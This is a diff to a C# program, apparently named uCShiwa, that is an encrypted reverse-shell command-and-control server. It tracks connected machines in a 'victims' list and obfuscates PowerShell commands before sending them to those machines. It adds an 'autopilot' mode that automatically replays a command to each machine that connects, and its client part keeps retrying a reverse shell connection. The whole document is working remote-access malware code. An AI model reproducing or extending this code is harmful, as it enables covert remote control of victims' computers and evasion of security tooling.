@@ -1,4 +1,5 @@
 using System;
+using System.Collections.Generic;
 using System.Net;
 using System.Net.Security;
 using System.Net.Sockets;
@@ -9,6 +10,7 @@ using System.Management.Automation;
 using System.Collections.ObjectModel;
 using System.Threading;
 using System.Text.RegularExpressions;
+using System.Linq.Expressions;
 
 namespace uCShiwa
 {
@@ -21,69 +23,89 @@ namespace uCShiwa
             {
                 Int16 port = Int16.Parse(args[0]);
                 var certificate = new X509Certificate2(args[1], args[2]);
-                Console.WriteLine("<0> Server mode\n<0> Port: {0:D}", port);
+                string message;
+                string autopilotMsg = string.Empty;
+                string victim = string.Empty;
+                List<string> victims = new();
+                bool backgroundMode = false; 
+                bool autopilot = false;
 
-                //Start Tcp Listener, wait for client and get SSL stream
+                Console.WriteLine("<0> Server mode\n<0> Port: {0:D}", port);
                 var listener = new TcpListener(IPAddress.Any, port);
                 listener.Start();
 
                 while (true)
                 {
-                    var client = listener.AcceptTcpClient();
-                    var stream = client.GetStream();
-                    SslStream sslStream = new SslStream(stream, false);
-                    sslStream.AuthenticateAsServer(certificate, false, System.Security.Authentication.SslProtocols.Tls12, false);
-                    
-                    UServer.printConnection(sslStream);
 
-                    string message;
-
-                    //cmd conf
-                    bool backgroundMode = false; // close connection without read response
-
-
-                    while (client.Connected)
+                    try
                     {
-                        UServer.ULog(client.Client.RemoteEndPoint.ToString());
-                        Console.Write("<0> {0}>", client.Client.RemoteEndPoint);
+                        var client = listener.AcceptTcpClient();
+                        var stream = client.GetStream();
+                        SslStream sslStream = new SslStream(stream, false);
+                        sslStream.AuthenticateAsServer(certificate, false, System.Security.Authentication.SslProtocols.Tls12, false);
+                        UServer.printConnection(sslStream);
 
-                        message = Console.ReadLine();
-                        //message = File.ReadAllText("CommandeOneline.txt");
-
-                        UServer.ULog(message);
-
-                        //specific commands
-                        if ("exit" == message)
+                        while (client.Connected)
                         {
-                            client.Close();
-                            Console.WriteLine("exit cmd: connexion closed");
-                        }
-                        else if ("bg" == message)
-                        {
-                            backgroundMode = !backgroundMode;
-                            Console.WriteLine("backgroude mode: {0}", backgroundMode);
-                        }
-                        //not a specific message
-                        else
-                        {
-                            message += " |Out-String";
-                            message = UServer.ObfuscatePwsh(message);
 
-                            if (backgroundMode)
+                            victim = client.Client.RemoteEndPoint.ToString().Split(":")[0];
+                            UServer.ULog(victim);
+
+                            if (!victims.Contains(victim))
                             {
-                                Common.sendMsg(message, sslStream);
-                                client.Close();
-                                Console.WriteLine("bg mode: connexion closed");
+                                victims.Add(victim);
                             }
-                            else
+
+                            Console.Write("<{0}/{1}> [{2}]>>>", victims.IndexOf(victim) + 1, victims.Count, victim);
+                            message = (autopilot) ? autopilotMsg : Console.ReadLine();
+
+                            UServer.ULog(message);
+
+                            switch (message)
                             {
-                                Common.sendMsg(message, sslStream);
-                                message = Common.readMsg(sslStream, client);
-                                Console.WriteLine(message);
-                                UServer.ULog(message);
+                                case "exit":
+                                    client.Close();
+                                    Console.WriteLine("<Closed>");
+                                    break;
+
+                                case "bg":
+                                    backgroundMode = !backgroundMode;
+                                    Console.WriteLine("<backgroude mode: {0}>", backgroundMode);
+                                    break;
+
+                                case "autopilot":
+                                    backgroundMode = true;
+                                    autopilot = true;
+                                    Console.WriteLine("<autopilot: {0}>", autopilot);
+                                    break;
+
+                                default:
+                                    autopilotMsg = message;
+                                    message += " |Out-String";
+                                    message = UServer.ObfuscatePwsh(message);
+                                    if (backgroundMode)
+                                    {
+                                        Common.sendMsg(message, sslStream);
+                                        client.Close();
+                                        Console.WriteLine("<bg mode ->Closed>");
+                                    }
+                                    else
+                                    {
+                                        Common.sendMsg(message, sslStream);
+                                        message = Common.readMsg(sslStream, client);
+                                        Console.WriteLine(message);
+                                        UServer.ULog(message);
+                                    }
+                                    break;
                             }
+
                         }
 
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine(e.InnerException);
+                        Console.WriteLine("<0> Restart Server\n<0> Port: {0:D}", port);
                     }
                 }
 
@@ -120,7 +142,7 @@ namespace uCShiwa
                     }
                     catch(Exception e)
                     {
-                        Console.WriteLine("{0} Exception caught.", e);
+                        Console.WriteLine(e.InnerException);
                         Thread.Sleep(3000);
                         Console.WriteLine("<0> Retry:\nReverse Shell mode\n<0> Ip: {0}\n<0> Port: {1:D}", ip, port);
                     }
